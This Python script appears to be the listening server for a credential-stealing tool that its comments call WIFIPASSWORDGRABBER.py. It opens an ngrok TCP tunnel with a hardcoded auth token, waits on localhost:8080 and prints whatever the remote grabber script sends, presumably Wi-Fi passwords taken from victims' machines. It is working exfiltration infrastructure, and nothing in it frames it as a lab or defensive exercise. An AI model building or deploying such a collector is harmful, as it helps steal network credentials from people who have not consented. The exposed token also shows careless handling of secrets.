# Modules required for server, ngrok serves as 3rd party cross network communication
# and socket is for allowing the server to be connected too by the client in Method 1 and 2
# described in WIFIPASSWORDGRABBER.py
import socket
import ngrok

# Usually you would hide this in the system for security reasons, however I need other people
# to be able to use ngrok and I don't mind if people have access to this, due to it being free
ngrokToken = "3HyzaTZHwEjTDYAwU0XYRX6Jshc_44xz1euDXComEJHTU9B1N"

# establishes a ngrok listener, essentially telling the ngrok servers that this computer exists
# using the ngrok token to connect to my account, and proto telling ngrok what type of connection
# we require
listener = ngrok.forward("localhost:8080", authtoken=ngrokToken, proto="tcp")

# Prints out url connection so we can plug it into WIFIPASSWORDGRABBER.py
print(f"Listener established at: {listener.url()}");


# Creates an IPv4 TCP socket
# Essentially connects a socket of the computer to ngrok's servers, making the socket wait for ngrok
# to send something over from the client script
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind(('127.0.0.1', 8080))
server_socket.listen()

# Waits for a connection to happen
while True:
    # Accept connection from client program
    conn, addr = server_socket.accept()
    print(f"Connected by {addr}")
    
    try:
        # Receive data up to 4096 bytes and decode it
        data = conn.recv(4096).decode('utf-8')
        if data:
            print(f"{data}")
    # This finally allows for more information to be sent rather than just closing the program  
    finally:
        conn.close()